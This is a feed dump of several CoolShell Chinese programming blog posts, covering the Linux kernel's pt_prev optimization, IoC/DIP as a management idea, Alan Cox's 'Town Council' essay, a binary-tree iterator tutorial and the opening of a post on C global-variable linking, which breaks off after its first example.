<p>然而这里为啥要pt_prev维护一个后向节点呢？这是有深意的，它的作用就是将当前匹配协议项的回调操作延时了。举个例子，如果链表遍历中找到某个匹配项，当前循环仅仅用pt_prev去记录这个匹配项，除此之外不做任何事情，待到下一次匹配项找到时，才去做上一个匹配项pt_prev的回调操作，直到循环结束，才会去做最后的匹配项的回调（当然pt_prev==NULL表示没有一次匹配，直接释放掉），所以这是一种<strong>拖延战术</strong>。有什么好处呢？就是比原先节省了很多不必要的操作。那么哪些操作是不必要的呢？这里我们逆向思考一下，我们看到clone是在协议字段匹配并且pt_prev!=NULL的前提条件下执行的，而kfree是在pt_prev==NULL的前提条件下执行的。在此可以假设一下，如果ptype链表中存在N项协议与之匹配，那么这段代码只会执行N-1次clone，而没有pt_prev时将会执行N次clone和1次kfree，再如果ptype链表中有且仅有一项协议与之匹配，那么整个循环既不会执行到第601行的clone，也不会执行到第622行的kfree。</p>
<p>也就是说，<strong>当整个链表至少有一项匹配的一般情况下，pt_prev存在比没有时减少了一次clone和一次kfree的开销；只有全部不匹配的最差情况下，两者都只做一次kfree动作，持平。这就是延迟策略产生的效益</strong>。</p>
<p>熟悉TCP/IP协议族的开发人员应该知道<strong>MTU（最大传输单元）</strong>这个概念，遵循不同协议的MTU值是不同的。比如以太网帧MTU是1500个字节，802.3帧MTU是1492字节，PPP链路帧MTU是269字节，而超通道MTU理论上是65535字节。要知道在一个高速吞吐量通信网络环境下，在大块数据分片传输线路里，在内核级别代码中，减少一处系统开销意味着什么？</p>
<p>其实我们完全可以抛开一切网络协议相关知识，这不过是一段极其普通的单向链表操作而已，逻辑并不复杂。但是看看人家顶级黑客是怎么思考和coding的，对比一下自己写过的代码，多少次数据处理是用一个简单的for循环匆匆敷衍了事而没有进一步思考其中的粗陋和不合理之处？面对真正的编程高手这种“心计”与“城府”，你是不是有种莫名不安感？你会怀疑你真的了解怎么去使用和操作C语言中基本的链表数据结构么？如果答案是肯定的，那就开始颤抖吧（哈，别误会，其实上面这段话不过是笔者的自我告解罢了）~~~</p>
<p>最后，让我们感谢尊敬的<a href="https://en.wikipedia.org/wiki/Alan_Cox" target="_blank">Alan Cox</a>大大对Linux社区卓越精细、无与伦比的贡献！（Alan是图中中部戴红帽子的那位）</p>
<p><img alt="image placeholder" ></p>
<p><strong>附注：</strong></p>
<p>最新的Linux-2.6.x版本中协议栈实现部分变动很大，但/net/core/dev.c的netif_receive_skb函数里仍然保留了pt_prev这种用法，目的是一样的，都是为了减少一次系统开销的优化操作。</p>
<p>关于Alan，他在斯旺西大学工作时，在学校服务器上安装了一个早期的linux版本，供学校使用。他修正了许多的问题，重写了网络系统中的许多部份。随后成为linux内核开发小组中的重要成员。<a href="https://en.wikipedia.org/wiki/Alan_Cox" target="_blank">Alan Cox</a>负责维持2.2版，在2.4版上拥有自己的分支（在版本号上会冠上ac，如 2.4.13-ac1）。他的分支版本非常稳定，修正许多错误，许多厂商都使用他的版本。在他去进修工商管理硕士之前，涉入许多linux内核开发的事务，在社群中有很高的地位，有时会被视为是Linus之下的第二号领导者。</p>
<p>不过，今年1月28日的时候，Alan因为家庭原因宣布退出Linux项目了，下面是他Google+的声明：</p>
<blockquote><p>“I’m leaving the Linux world and Intel for a bit for family reasons, I’m aware that ‘family reasons’ is usually management speak for ‘I think the boss is an asshole’ but I’d like to assure everyone that while I frequently think Linus is an asshole (and therefore very good as kernel dictator) I am departing quite genuinely for family reasons and not because I’ve fallen out with Linus or Intel or anyone else. Far from it I’ve had great fun working there.”</p></blockquote>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-06-30T12:27:04+08:00</pubDate>
<guid>https://coolshell.cn/articles/9859.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ IoC/DIP其实是一种管理思想 ]]></title>
<link>https://coolshell.cn/articles/9949.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" > 关于IoC的的概念提出来已经很多年了，其被用于一种面象对像的设计。我在这里再简单的回顾一下这个概念。我先谈技术，再说管理。</p>
<p>话说，我们有一个开关要控制一个灯的开和关这两个动作，最常见也是最没有技术含量的实现会是这个样子：</p>
<p><img alt="image placeholder" ></p>
<p>然后，有一天，我们发现需要对灯泡扩展一下，于是我们做了个抽象类：</p>
<p><img alt="image placeholder" ></p>
<p>但是，如果有一天，我们发现这个开关可能还要控制别的不单单是灯泡的东西，我们就发现这个开关耦合了灯泡这种类别，非常不利于我们的扩展，于是反转控制出现了。</p>
<p>就像现实世界一样，造开关的工厂根本不关心要控制的东西是什么，它只做一个开关应该做好的事，就是把电接通，把电断开（不管是手动的，还是声控的，还是光控，还是遥控的），而我们的造各种各样的灯泡（不管是日关灯，白炽灯）的工厂也不关心你用什么样的开关，反正我只管把灯的电源接口给做出来，然后，开关厂和电灯厂依赖于一个标准的通电和断电的接口。于是产生了IoC控制反转，如下图：</p>
<p><span id="more-9949"></span></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;"><strong>所谓控制反转的意思是，开关从以前的设备的专用开关，转变到了控制电源的开关，而以前的设备要反过来依赖于开关厂声明的电源连接接口。只要符合开关厂定义的电源连接的接口，这个开关可以控制所有符合这个电源连接接口的设备</strong>。<span style="color: #ff0000;"><strong>也就是说，开关从依赖设备这种情况，变成了，设备反过来依赖于开关所定义的接口</strong></span>。</p>
<p>只要你看过我的那篇《<a title="从面向对象的设计模式看软件设计" href="https://coolshell.cn/articles/8961.html" target="_blank">面向对象设计其实和面象对象一点关系也没有</a>》，你就知道这样的例子在生活中太多见了。比如说：</p>
<p style="padding-left: 30px;">1）在交易的过程中，卖家向买家卖东西，一手交钱一手交货，所以，基本上来说卖家和买家必需强耦合（必需见面）。这个时候，银行出来做担保，买家把钱先垫到银行，银行让卖家发货，买家验货后，银行再把钱打给卖家。这就是反转控制。买卖双方把对对方的直接控制，反转到了让对方来依赖一个标准的交易模型的接口。股票交易也是一样的，证交所就是买卖双方的标准交易模型接口。</p>
<p style="padding-left: 30px;">2）上面这个例子，可能还不明显，再举一个例子。海尔公司作为一个电器制商需要把自己的商品分销到全国各地，但是发现，不同的分销渠道有不同的玩法，于是派出了各种销售代表玩不同的玩法，随着渠道越来越多，发现，每增加一个渠道就要新增一批人和一个新的流程，严重耦合并依赖各渠道商的玩法。实在受不了了，于是制定业务标准，开发分销信息化系统，只有符合这个标准的渠道商才能成为海尔的分销商。让各个渠道商反过来依赖自己标准。反转了控制，倒置了依赖。</p>
<p><strong>可见，控制反转和依赖倒置不单单的一种设计模式，反而更是一种管理模式。</strong></p>
<p>在大公司中，有很多很多的团队，这些团队开发的软件有很多依赖，跨团队合作是一件挺麻烦的事情，下面是一些比较真实的示例：</p>
<p style="padding-left: 30px;">1）一个网页会有很多频道，于是，我们的前端工程师进入到各个页面为各种频道开发他们的页面，随着频道越来越多，前端开发工程师的人数也越来越多，每增加一个频道，就要增加一个为这个频道服务的前端团队，于是，人数越来越多，干成了劳动密集型。为什么不反转控制，倒置依赖呢？前端的同学完全可以开发出各种页面的标准组件，布局，模板，以前与后端交互框架，然后，让后端的同学反过来依赖于前端的标准，使用前端的框架，前端的布局，模板，和组件，以向前端接入后端的模块。</p>
<p style="padding-left: 30px;">2）一个平台需要接入各种各样的业务系统，这些垂直业务系统都有自己的账号体系，于是这个平台为了要兼这些垂直系统的账号体系以做到权限控制，需要做各个系统和自己系统中的账号映射，并为账号和分配出来的资源设置各垂直系统的标识，还要在自己的代码中要写很多很多的依赖于各种账号体系的代码。其实，一个依赖倒置和反转控制就很简单。开发一个权限体系标准，让接入方的账号系统反过来依赖并控制这个标准的权限系统，从而做出一个干净的系统。</p>
<p style="padding-left: 30px;">3）还有一个云平台中的管理模式，一些底层服务的开发团队只管开发底层的技术，然后什么也不管了，就交给上层的开发人员，在底层团队的开发出来的产品上面开发各种管理这个底层资源的东西，比如：生产底层资源的业务，底层资源的控制台，底层资源的监控系统。这个让底层团队只干纯技术，不干与底层技术无关的东西，看似很科学，其实是做错了。因为，上层为各个云资源控制生产，开发控制台和监控的团队，随着接入的资源的越来越多，完全干不过来了，苦逼得一塌糊涂，因为底层的资源千差百怪，每接一个就要开发一堆这个产品的代码。这个时候依赖倒置和反转控制又可以解决问题了。很简单，上层为各个云资源控制生产，开发控制台，和监控的团队应该制定一个标准，让底层的IaaS云资源开发团队反过来依赖这个标准，统一接入方式，如果开发的云资源不符我的生产控制模型，没有控制台，不把监控数据喂入我的监控系统，对不起，请不要接入我这个PaaS平台。</p>
<p style="padding-left: 30px;">4）一个集中式的处理电子商务中的订单的流程。各个垂直业务线都需要通过这个平台来处理自己的交易业务，但是垂直业务线上的个性化需求太多。于是，这个技术平台开始出现了黑魔法——“为了害怕改变数据库表结构，不得不在数据库中预留一些字段，里面存把业务方的个性化字段存成如JSON这样的东西”，并为之自豪认为可以快速解决业务问题（WTF）。然而，恶梦并没就此结束，管理这个技术平台的小组开始发现，对来自各个业务方的需求应接不暇，各种变态需求严重干扰系统，各种技术决定越来越不好做，导致需求排期排不过来。于是，不单单得到了各个业务方的各种抱怨，最可怕的是还有高层老大们压过来的Deadline，加班加点，苦逼之极，最后业务方自己要去一个自己的平台。为什么不用依赖倒置和反转控制的思想呢？开发一个插件模型、工作流引擎和Pub/Sub系统，让业务方的个性化需求可以以插件的方式插入我的订单流程中，业务方自的数据存在自己的库中，业务逻辑也不要侵入我的系统，并可以使用工作流引擎或Pub/Sub的协义标准来自己定义工作流的各个步骤（甚至把工作流引擎的各个步骤的Decider交给各个业务方自行处理）。让各个业务方来依赖于我的标准插件和工作流接口，反转迭控制，让他们来控制我的系统，依赖倒置，让他们来依赖我的标准。（这个团队想过把自己的系统内部开源出去让别的团队也进来参与，可以是可以，但一定要用Linux/Git这种方式，允许出现多个分支，多个发行版。但多个版本又造成了多个业务平台，这会上上层垂直业务不知所措）</p>
<p style="padding-left: 30px;">5）看过《<a title="SteveY对Amazon和Google平台的吐槽 - 67,710 人阅读" href="https://coolshell.cn/articles/5701.html" target="_blank">SteveY对Amazon和Google平台的吐槽</a>》的人都知道，Amazon内部系统的SOA架构（这个SOA架构离IBM定义的那个非常变态的SOA还有一定距离），但是这基本上都是依赖倒置和控制反转的思路了—— <strong>与其让我来帮你实现你的业务逻辑，不如把我的业务逻辑开放成服务的方式让你来控制</strong>。</p>
<p style="padding-left: 30px;">6）再说一个我在Amazon经历的例子。有一个项目是在给Amazon的各个商区（Marketplace）做国际出口的业务，我们先把Media类的产品（书，DVD之类的）做国际出口开放，项目不难，就是让商家同意一个法律协议（上传自己的签名），然后后台小改一下。美国的，欧洲的做的都没有问题，物流团队在出口报关单上打的都是Amazon仓库的地址和商家的签名（本来这就是错的，打的应该是商家的地址和商家的签名），但是到了日本，就出了问题，因为日本海关即要日文信息，也要商家的英文名和英文地址，而我们的系统里面只有商家的日文信息。本来，这是一个挺简单的事——数据库里加两个字段，在那个同意条款的网页上收集一下商家的英文名和地址，然后把这些信息传给后面的物流团队。物流团队一看这个，发现搞不了，因为他还要传给仓库，N多的地方都要加这两个字段，还要写下各种if (site == JP)这样的判断。物流团队不蛮干，重新设计自己的系统。做一个Document Template的东西，这个就是那个那个要贴在物流盒子上的单子。再也不让各个业务团队把那些信息传过来，而是把这个Document Template的东西传给上面的业务方，他们想怎么写就怎么写， 写完后，把这个东西传回来。于是，大家依赖了一个标准的协议，而不是一其字段。（当然，这个改动过多，为此改了半年多，不过非常值）</p>
<p>所以说啊，在跨团队的工作中，</p>
<ul>
<li>如果依赖和控制的东西过多了，就需要制定标准，倒置依赖，反转控制。</li>
</ul>
<ul>
<li>控制欲望最好不要太强，不要想着能干所有的事情，要学会控制反转和依赖倒置原则。否则只会引火烧身。</li>
</ul>
<ul>
<li>反转控制和依赖倒置是一种智慧。</li>
</ul>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-07-05T08:44:03+08:00</pubDate>
<guid>https://coolshell.cn/articles/9949.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Alan Cox：大教堂、市集与市议会 ]]></title>
<link>https://coolshell.cn/articles/9917.html</link>
<content><![CDATA[ 
<p><strong>（感谢网友 </strong><a href="https://weibo.com/fullofbull" target="_blank"><strong>@我的上铺叫路遥</strong></a><strong> 投稿）</strong></p>
<p>在网上搜到的Cox大叔于1998年在开源社区写的一篇文章，当时很轰动，明眼人一看就知道是针对ESR那篇《大教堂与市集》，从中可见Alan在项目管理风格上乃至个人性格上都与ESR、Linus等人不同之处。顺便说一句，Alan现在出于“家庭原因”已经离开了Linux项目，他曾经评价Linus是<a href="http://apolyton.net/showthread.php/130212-Linus-Torvalds-is-a-terrible-engineer-Alan-Cox" target="_blank">a good developer but a terrible engineer</a>，甚至在Google+上直接说Linus就是一a*sh**e。不管如何，两位曾经十余年里并肩战斗惺惺相惜的大牛就此分道扬镳还是惹人唏嘘。</p>
<p>言归正传，以下为slashdot收录的英文原文：<a href="https://news.slashdot.org/story/98/10/13/1423253/featurecathedrals-bazaars-and-the-town-council" target="_blank">Cathedrals, Bazaars and the Town Council</a>。</p>
<p>以下是一些我对市集模式的想法，我认为这值得分享，这种模式会教你如何完全毁掉一个自由软件项目。我还举了一个我称之为“市议会”(Town Council)效应的实例（虽然那些市议员们可不这么认为，注：此处指Linux项目开发者）。</p>
<p>关于软件开发人员，你必须去了解一些情况。首先要了解的是真正优秀的程序员相对来说并不普遍，不仅如此，在很多其它专业领域里“真正的程序员”和一些捣乱的家伙之间的区别要比“伟大”和“普通”之间的区别要大得多，研究表明生产效率上最好的同其余的比重是30:1。</p>
<p>其次，你需要了解的是一大堆妄想型码农(wannabe programmer)总是善于发表意见。其中很多人患上了一种叫做“流行性热词”(buzzword)疾病，或者对他们“非黑即白”(one true path)的思考方式有着特殊的偏执，网上很多讨论都是廉价的。</p>
<p><span id="more-9917"></span></p>
<p>第三个关于软件项目的事情就是我们所谓的“闲杂人员”(the masses)。他们不是编程人员，而在其它方面有着大量贡献——文档编辑、用户支持，以及对那类经常争论你应该获得许可证才能上网的人的说服工作。</p>
<p>我想以Linux 8086（注，Intel设计的16位处理器架构）为例来说明如何将整个工程全部搞砸。将Linux的一个子集移植到8086上大体是这世上最无聊的活动之一。整件事的发起就像个笑话并走向失控。</p>
<p>只有极少数真正的程序员会将时间及其良好的精神状态（或许那是假的）花费在那些唯一价值在于“黑客精神”(Hack Value)的项目上，故而在任何时候那种项目也就两三个核心贡献人员而已。</p>
<p>不幸的是大批人认为将Linux运行在8086上是干净的，为此义不容辞地想要“入伙”。这类人大多属于妄想型码农之流，以至于连闲杂人员在一个安全距离之外都会沾染上这个项目的“愚蠢”因子。</p>
<p>问题的导火索在于一大批充满（大多善意的）危险的一知半解的人们的意识观念——不是代码，而是意识观念。他们似乎很懂得如何去编程，但很多人连“Hello World”这样的C程序都不会。他们花了几星期时间去争论并投票该使用什么编译器，甚至在项目开展一年后还在争论是否去写个充分完美的编译器。他们热衷于辩论如何生成大量二进制文件，却又对内核swapper（注，即idle task）设计一无所知。</p>
<p>Linux 8086项目仍然进行着，真正的开发人员将邮件列表里许多其他成员加入到清除文件(kill files)中，以便他们之间可以顺畅地通过邮件列表沟通，只因半吊子打酱油的家伙实在太多了。这一切不再是市集模式，而是形成了一个核心小组，对圈子里许多人而言这是一种礼貌用语。在这种情形下人们不可避免地处于被动位置。</p>
<p>像Linux这种基于用户/程序员的项目成长缓慢，虽然它是靠着一群贡献代码的人得以成长起来，但这些人的背景要么是从原始的Minix（注，一种微内核操作系统）黑客社区起家，要么通过艰难的方式不断从头学起。随着项目增长，人们本应该形成一个“Linux内核结构规划管理委员会”，而不是掉入将人们招来唤去，不将失败视为问题的怪圈，用Linus的话来说就是“给我看源码”。</p>
<p>如果有人陷入困境，他可以发帖询问，在这之前包括现在很大程度上都基于人们正常地拥有时间并具备知识来回复他。在Linux 8086的案例中，开发人员很长一段时间身陷囹圄。假使主动活跃的程序员对只有潜在用处的妄想型码农的比例更高一点的话，我们就可以将一些杂音转化成生产力。项目也就获得更多有用的程序员，他们可以轮流向他人传授经验，任何学习活动都会让你变得更好，哪怕只有一些少量实习生。</p>
<p>一些人会认为你无法将那些“次要程序员”(lesser programmer)训练成真正的程序员。就Linux项目的个人经验而言，很多人员只要获得一丁点儿的帮助和自信鼓励都将成为世界上最好的开发人员之一。只要帮助和鼓励足够多，很多人就能成功。</p>
<p>Linux 8086总算大部分从“侵扰”中恢复过来，可至今仍是个不起眼的小项目。你可以从CVS目录树上下载这个由Alistair Riddich领导的项目，他做了很多优秀的工作。随着市议员的撤出，人们可以询问、参与并改善这个项目。</p>
<p>我们从这个项目，还有其它相同命运的早期Linux 16位处理器项目（有的已死）中很清楚地学到以下几点教训。</p>
<ul>
<li>从项目一开始就发布源代码。哪怕不是很有用也无关紧要，将市议会排序分类的最好方式就是发布源代码并告知人们。Linux、KDE以及GNOME都遵循这种方式并获益良多。你可以花一辈子时间去争论怎样写代码才是正确的。只要代码公布，人们（不管水平怎样）都会把玩它。</li>
</ul>
<ul>
<li>要欣赏那些给一点帮助就会对项目做出巨大贡献的人。如果他们最初的补丁有错误，不要盛气凌人，向其解释问题出在哪里并给出解决方案的建议，或者可以查询解决方法的地方。解答真正的问题，帮助别人，你所花费的一分一秒都会成十倍地回报在项目上，对社会也会带来无法估量的好处。[注]</li>
</ul>
<ul>
<li>不要忘记那些非开发人员。我难过地发现许多人问起“前5名最重要的内核成员”时却极少涉及在所有人中最重要的一些——他们负责维护网站，更新日志和邮件列表，还有编辑文档，这些都是同等重要。<br>
Linus那句“给我看源代码”对真正的项目来说是个狭隘的视角。当你听到人们说“我很想帮忙，可我不会编程”，那么他可以从事文档编写。当人们说“但英语不是我的第一语言”，这时你需要的是一位文档编辑或另一门语言翻译者。</li>
</ul>
<ul>
<li>尝试将有用的人从杂音中分离出来，将有意愿帮忙的人从一大堆无聊评论中分离出来是很难的。在Linux 8086项目中我的确错误地放弃了这一目标，如何将那些只会空谈而又无所事事的人弄走是一门学问。</li>
</ul>
<p>下次碰到人们在项目上投票，或者问题讨论了一个月才实现这类情况，给予他们警告。这样才能使人正确地解决问题。在你看来如果一些稀奇古怪的事务不顾一切地运行着，要求他们给你发个补丁，只要能够生效的话。</p>
<p>小心地说“我们应该怎样”之类的话，对“我该如何做”这样的人伸出援手。</p>
<p>Alan</p>
<p>[注]这段话举个例子说明一下。Linux IPv6源码作者以前在葡萄牙上网聊天，只会简单讨论和问一些基本问题。我们助其弄明白一些内核原理之后，他写了大约75%的IPv6协议栈代码，他最近受聘于美国思科公司。</p>
<p>附录一：一篇针对本文的<a href="http://tech.groups.yahoo.com/group/java-os-project/message/2358?var=1&amp;p=1" target="_blank">吐槽贴</a></p>
<p>附录二：2009年Cox回复Torvalds的<a href="https://lkml.org/lkml/2009/7/28/375" target="_blank">邮件</a>，事情起因是Cox的一个tty patch导致<a href="https://lkml.org/lkml/2009/7/11/125" target="_blank">kdesu(KDE project’s su utility)</a>程序无法工作，该问题争论长达两个星期，此后Alan离开了Linux项目投奔Intel。</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-07-08T15:42:27+08:00</pubDate>
<guid>https://coolshell.cn/articles/9917.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 二叉树迭代器算法 ]]></title>
<link>https://coolshell.cn/articles/9886.html</link>
<content><![CDATA[ 
<p><strong>（感谢 </strong><a href="https://weibo.com/weidagang" target="_blank">@文艺复兴记</a><strong>（todd） 投递此文）</strong></p>
<p>二叉树(Binary Tree)的前序、中序和后续遍历是算法和数据结构中的基本问题，基于递归的二叉树遍历算法更是递归的经典应用。</p>
<p>假设二叉树结点定义如下：</p>
<p></p>
<pre data-enlighter-language="cpp" class="EnlighterJSRAW">// C++
struct Node {
    int value;
    Node *left;
    Node *right;
}
</pre>
<p>中序递归遍历算法：</p>
<p></p>
<pre data-enlighter-language="cpp" class="EnlighterJSRAW">// C++
void inorder_traverse(Node *node) {
    if (NULL != node-&gt;left) {
        inorder_traverse(node-&gt;left);
    }
    do_something(node);
    if (NULL != node-&gt;right) {
        inorder_traverse(node-&gt;right);
    }
}
</pre>
<p>前序和后序遍历算法类似。</p>
<p>但是，仅有遍历算法是不够的，在许多应用中，我们还需要对遍历本身进行抽象。假如有一个求和的函数sum，我们希望它能应用于链表，数组，二叉树等等不同的数据结构。这时，我们可以抽象出迭代器(Iterator)的概念，通过<strong>迭代器把算法和数据结构解耦了</strong>，使得通用算法能应用于不同类型的数据结构。我们可以把sum函数定义为：</p>
<p><span id="more-9886"></span></p>
<p></p>
<pre data-enlighter-language="cpp" class="EnlighterJSRAW">int sum(Iterator it)
</pre>
<p>链表作为一种线性结构，它的迭代器实现非常简单和直观，而二叉树的迭代器实现则不那么容易，我们不能直接将递归遍历转换为迭代器。究其原因，这是因为二叉树递归遍历过程是编译器在调用栈上自动进行的，程序员对这个过程缺乏足够的控制。既然如此，那么我们如果可以自己来控制整个调用栈的进栈和出栈不是就达到控制的目的了吗？我们先来看看二叉树遍历的非递归算法：</p>
<p></p>
<pre data-enlighter-language="cpp" class="EnlighterJSRAW">// C++
void inorder_traverse_nonrecursive(Node *node) {
    Stack stack;
    do {
        // node代表当前准备处理的子树，层层向下把左孩子压栈，对应递归算法的左子树递归
        while (NULL != node) {
            stack.push(node);
            node = node-&gt;left;
        }
        do {
            Node *top = stack.top();
            stack.pop(); //弹出栈顶，对应递归算法的函数返回
            do_something(top);
            if (NULL != top-&gt;right) {
                node = top-&gt;right; //将当前子树置为刚刚遍历过的结点的右孩子，对应递归算法的右子树递归
                break;
            }
        }
        while (!stack.empty());
    }
    while (!stack.empty());
}
</pre>
<p>通过基于栈的非递归算法我们获得了对于遍历过程的控制，下面我们考虑如何将其封装为迭代器呢？ 这里关键在于理解遍历的过程是由栈的状态来表示的，所以显然迭代器内部应该包含一个栈结构，每次迭代的过程就是对栈的操作。假设迭代器的接口为：</p>
<p></p>
<pre data-enlighter-language="cpp" class="EnlighterJSRAW">// C++
class Iterator {
    public:
        virtual Node* next() = 0;
};
</pre>
<p>下面是一个二叉树中序遍历迭代器的实现：</p>
<p></p>
<pre data-enlighter-language="cpp" class="EnlighterJSRAW">//C++
class InorderIterator : public Iterator {
    public:
        InorderIterator(Node *node) {
            Node *current = node;
            while (NULL != current) {
                mStack.push(current);
                current = current-&gt;left;
            }
        }
        virtual Node* next() {
            if (mStack.empty()) {
                return NULL;
            }
            Node *top = mStack.top();
            mStack.pop();
            if (NULL != top-&gt;right) {
                Node *current = top-&gt;right;
                while (NULL != current) {
                    mStack.push(current);
                    current = current-&gt;left;
                }
            }
            return top;
         }
    private:
        std::stack&lt;Node*&gt; mStack;
};
</pre>
<p>下面我们再来考察一下这个迭代器实现的时间和空间复杂度。很显然，由于栈中最多需要保存所有的结点，所以其空间复杂度是O(n)的。那么时间复杂度呢？一次next()调用也最多会进行n次栈操作，而整个遍历过程需要调用n次next()，那么是不是整个迭代器的时间复杂度就是O(n^2)呢？答案是否定的！因为每个结点只会进栈和出栈一次，所以整个迭代过程的时间复杂度依然为O(n)。其实，这和递归遍历的时空复杂度完全一样。</p>
<p>除了上面显式利用栈控制代码执行顺序外，在支持yield语义的语言（C#, Python等)中，还有更为直接的做法。下面基于yield的二叉树中序遍历的Python实现：</p>
<p></p>
<pre data-enlighter-language="python" class="EnlighterJSRAW">// Python
def inorder(t):
    if t:
        for x in inorder(t.left):
            yield x
        yield t.label
        for x in inorder(t.right):
            yield x
</pre>
<p>yield与return区别的一种通俗解释是yield返回时系统会保留函数调用的状态，下次该函数被调用时会接着从上次的执行点继续执行，这是一种与栈语义所完全不同的流程控制语义。我们知道Python的解释器是C写的，但是C并不支持yield语义，那么解释器是如何做到对yield的支持的呢？ 有了上面把递归遍历变换为迭代遍历的经验，相信你已经猜到Python解释器一定是对yield代码进行了某种变换。如果你已经能够实现递归变非递归，不妨尝试一下能否写一段编译程序将yield代码变换为非yield代码。</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-07-14T11:08:23+08:00</pubDate>
<guid>https://coolshell.cn/articles/9886.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ C语言全局变量那些事儿 ]]></title>
<link>https://coolshell.cn/articles/10115.html</link>
<content><![CDATA[ 
<p><strong>（感谢网友 </strong><a href="https://weibo.com/fullofbull" target="_blank"><strong>@我的上铺叫路遥</strong></a><strong> 投稿）</strong></p>
<p>作为一名程序员，如果说沉迷一门编程语言算作一种乐趣的话，那么与此同时反过来去黑一门编程语言就是这种乐趣的升华。今天我们就来黑一把C语言，好好展示一下这门经典语言令人抓狂的一面。</p>
<p>我们知道，全局变量是C语言语法和语义中一个很重要的知识点，首先它的存在意义需要从三个不同角度去理解：对于程序员来说，它是一个记录内容的<strong>变量(variable)</strong>；对于编译/链接器来说，它是一个需要解析的<strong>符号(symbol)</strong>；对于计算机来说，它可能是具有地址的一块<strong>内存(memory)</strong>。其次是语法/语义：从作用域上看，带static关键字的全局变量范围只能限定在文件里，否则会外联到整个模块和项目中；从生存期来看，它是静态的，贯穿整个程序或模块运行期间（<span style="color: #ff0000;"><strong>注意，正是跨单元访问和持续生存周期这两个特点使得全局变量往往成为一段受攻击代码的突破口，了解这一点十分重要</strong></span>）；从空间分配上看，定义且初始化的全局变量在编译时在数据段(.data)分配空间，定义但未初始化的全局变量<strong>暂存(tentative definition)</strong>在.bss段，编译时自动清零，而仅仅是声明的全局变量只能算个符号，寄存在编译器的符号表内，不会分配空间，直到链接或者运行时再重定向到相应的地址上。</p>
<p>我们将向您展现一下，<strong>非static限定全局变量</strong>在编译/链接以及程序运行时会发生哪些有趣的事情，顺便可以对C编译器/链接器的解析原理管中窥豹。以下示例对ANSI C和GNU C标准都有效，笔者的编译环境是Ubuntu下的GCC-4.4.3。</p>
<p><span id="more-10115"></span></p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E7%AC%AC%E4%B8%80%E4%B8%AA%E4%BE%8B%E5%AD%90" title="第一个例子">第一个例子</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E7%AC%AC%E4%BA%8C%E4%B8%AA%E4%BE%8B%E5%AD%90" title="第二个例子">第二个例子</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E7%AC%AC%E4%B8%89%E4%B8%AA%E4%BE%8B%E5%AD%90" title="第三个例子">第三个例子</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E7%AC%AC%E5%9B%9B%E4%B8%AA%E4%BE%8B%E5%AD%90" title="第四个例子">第四个例子</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E7%AC%AC%E4%B8%80%E4%B8%AA%E4%BE%8B%E5%AD%90"></span>第一个例子<span class="ez-toc-section-end"></span>
</h4>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">/* t.h */
#ifndef _H_
#define _H_
int a;
#endif

/* foo.c */
#include &lt;stdio.h&gt;
#include "t.h"

struct {
   char a;
   int b;
} b = { 2, 4 };

int main();

void foo()
{
    printf("foo:\t(&amp;a)=0x%08x\n\t(&amp;b)=0x%08x\n
        \tsizeof(b)=%d\n\tb.a=%d\n\tb.b=%d\n\tmain:0x%08x\n",
        &amp;a, &amp;b, sizeof b, b.a, b.b, main);
}

/* main.c */
#include &lt;stdio.h&gt;
#include "t.h"

int b;
int c;

int main()
{
    foo();
    printf("main:\t(&amp;a)=0x%08x\n\t(&amp;b)=0x%08x\n
        \t(&amp;c)=0x%08x\n\tsize(b)=%d\n\tb=%d\n\tc=%d\n",
        &amp;a, &amp;b, &amp;c, sizeof b, b, c);
	return 0;
}
</pre>
<p>Makefile如下：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">test: main.o foo.o
	gcc -o test main.o foo.o

main.o: main.c
foo.o: foo.c

clean:
	rm *.o test
</pre>
<p>运行情况：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">foo:	(&amp;a)=0x0804a024
	(&amp;b)=0x0804a014
	sizeof(b)=8
	b.a=2
	b.b=4
	main:0x080483e4
main:	(&amp;a)=0x0804a024
	(&amp;b)=0x0804a014
	(&amp;c)=0x0804a028
	size(b)=4
	b=2
	c=0
</pre>
